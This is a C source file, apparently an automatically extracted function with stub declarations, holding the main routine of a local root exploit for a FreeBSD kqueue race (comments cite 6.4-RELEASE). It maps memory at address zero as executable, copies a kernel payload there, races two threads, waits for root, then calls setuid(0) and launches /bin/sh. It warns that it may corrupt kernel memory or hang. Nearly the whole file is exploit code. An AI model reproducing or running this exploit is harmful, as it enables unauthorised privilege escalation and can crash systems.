#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  pthread_t ;
struct TYPE_2__ {int tv_nsec; scalar_t__ tv_sec; } ;

/* Variables and functions */
 int MAP_ANON ; 
 int MAP_FIXED ; 
 int PROT_EXEC ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int /*<<< orphan*/  code_end ; 
 scalar_t__ do_thread ; 
 scalar_t__ do_thread2 ; 
 int /*<<< orphan*/  execl (char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  getchar () ; 
 int /*<<< orphan*/  geteuid () ; 
 scalar_t__ getuid () ; 
 int /*<<< orphan*/  gotroot ; 
 int /*<<< orphan*/  kernel_code ; 
 int /*<<< orphan*/  kq ; 
 int /*<<< orphan*/  kqueue () ; 
 int /*<<< orphan*/  memcpy (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int) ; 
 scalar_t__ mmap (void*,int,int,int,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int /*<<< orphan*/  pthread_create (int /*<<< orphan*/ *,int /*<<< orphan*/ *,void*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  setuid (int /*<<< orphan*/ ) ; 
 TYPE_1__ timeout ; 
 int /*<<< orphan*/  usleep (int) ; 

int main(void) {
	int i;
	pthread_t pth, pth2;

	if (!getuid() || !geteuid()) {
		printf("already root.\n");
		exit(-1);
	}

	printf("BEWARE! this exploit isn't 100%% reliable. successful exploitation\n"
		"may cause kernel memory corruption leading to system crash.\n"
		"it is also possible, that exploit will hang and such process\n"
		"will be unkillable. hit enter if you want to continue.\n");

	getchar();

	/* safe landing place for 6.4-RELEASE - it protects us from page fault
	   due to invalid read */

	if (mmap((void *)0x408b0000, 0x4000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
		perror("mmap");
		exit(-1);
	}

	if (mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
		perror("mmap");
		exit(-1);
	}

	memcpy(0, &kernel_code, &code_end - &kernel_code);

	if ((kq = kqueue()) < 0) {
		perror("kqueue");
		exit(-1);
	}

	pthread_create(&pth, NULL, (void *)do_thread, NULL);
	pthread_create(&pth2, NULL, (void *)do_thread2, NULL);

	timeout.tv_sec = 0;
	timeout.tv_nsec = 1;

	printf("waiting for root... it should take no more than few seconds.\n"
	     "otherwise, run exploit again.\n");
	i = 0;

	while (!gotroot && i++ < 4000)
		usleep(100);

	setuid(0);

	if (getuid()) {
		printf("failed. on unpatched systems, the exploit will be unkillable from now. try again.\n");
		exit(-1);
	}

	execl("/bin/sh", "sh", NULL);

	return 0;
}